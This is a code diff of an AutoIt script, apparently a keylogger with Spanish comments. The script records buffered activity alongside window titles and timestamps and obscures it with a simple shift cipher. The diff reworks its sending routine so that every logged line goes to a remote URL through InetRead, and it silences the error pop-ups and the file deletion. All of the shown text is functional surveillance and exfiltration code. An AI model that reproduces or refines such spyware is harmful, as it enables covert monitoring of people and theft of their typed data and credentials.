@@ -30,7 +30,7 @@ Func _Main()
 	send_file(true)
 
 
-
+	
     While 1
         Sleep(10)
         ; Comprobar si la ventana activa ha cambiado
@@ -42,10 +42,12 @@ Func _Main()
 
         ; Comprobar si han pasado 30 segundos desde la última vez que se escribió en el archivo
         If TimerDiff($lastActiveTime) > 30000 Then ; 30 segundos en milisegundos
+		
 			write_file()
             $lastActiveTime = TimerInit()
-        EndIf
-		send_file(false)
+			send_file(false)
+		EndIf
+		
 		
     WEnd
 EndFunc
@@ -55,7 +57,7 @@ EndFunc
 
 Func write_file()
     If $buffer <> "" Then
-		$file = FileOpen($file_name, $FO_READ + $FO_OVERWRITE)
+		$file = FileOpen($file_name, $FO_APPEND )
         $title_1 = WinGetTitle("")
         $buffer = @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
         $buffer = CifrarDesplazamiento($buffer, 3)
@@ -69,23 +71,21 @@ EndFunc
 
 Func send_file($forced_action)
 	if TimerDiff($last_send) > 600000 or $forced_action=true then 
-		Local $aArray = FileReadToArray($file_name)
-		If @error Then
-			MsgBox($MB_SYSTEMMODAL, "", "There was an error reading the file. @error: " & @error) 
-		Else
-			For $i = 0 To UBound($aArray) - 1 
-					InetRead($url & $aArray[$i], $INET_FORCERELOAD)
-			Next
+	
+		If FileExists($file_name) Then ; Verifica si el archivo existe
+			Local $aArray = FileReadToArray($file_name)
+;			If @error Then
+;				MsgBox($MB_SYSTEMMODAL, "", "There was an error reading the file. @error: " & @error) 
+;			Else
+				For $i = 0 To UBound($aArray) - 1 
+						InetRead($url & $aArray[$i], $INET_FORCERELOAD)
+				Next
+;			EndIf
+			$last_send=0
+;			FileDelete($file_name) ; Borra el archivo después de enviarlo
 		EndIf
-		$last_send=0
-		FileClose($file_name)
-		Local $iDelete = FileDelete($file_name)
-		If $iDelete Then
-			MsgBox($MB_SYSTEMMODAL, "", "The file was successfuly deleted.")
-		Else
-			MsgBox($MB_SYSTEMMODAL, "", "An error occurred whilst deleting the file.")
-		EndIf
-	endif
+		$file = FileOpen($file_name, $FO_APPEND) ; Abre un nuevo archivo para escribir
+ 	endif
 EndFunc
 
 
